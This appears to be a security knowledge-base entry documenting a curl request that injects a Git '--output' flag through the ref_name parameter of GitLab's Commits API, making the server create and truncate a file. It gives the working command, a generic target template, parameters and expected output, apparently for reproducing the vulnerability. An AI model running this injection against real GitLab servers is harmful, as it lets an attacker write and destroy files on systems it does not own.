---
id: cmd-curl-commits-injection
data: >-
  curl
  'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
tags:
  - injection
  - api
type: command
output: >-
  API response with commits, but triggers backend Git commands that create and
  truncate /tmp/written
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.771Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-commits-injection

## Command

```bash
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

## Description

Sends a GET request to the GitLab Commits API with a malicious ref_name to inject the --output Git flag, causing git log to write commits to /tmp/written. Used to reproduce the initial file write and truncation vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| path=. | Specifies all files for broad commit log | Yes |
| ref_name=--output=/tmp/written | Injects Git flag for file output | Yes |

## Examples

### Basic Usage

```bash
curl 'http://target/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

### Advanced Usage

Adapt target URL and project ID for different instances.

## Expected Output

HTTP 200 with JSON commits array; server-side: file /tmp/written created and truncated to 0 bytes.

## Related

- [[procedures/Inject-Malicious-Ref-Name-in-Commits-API]]
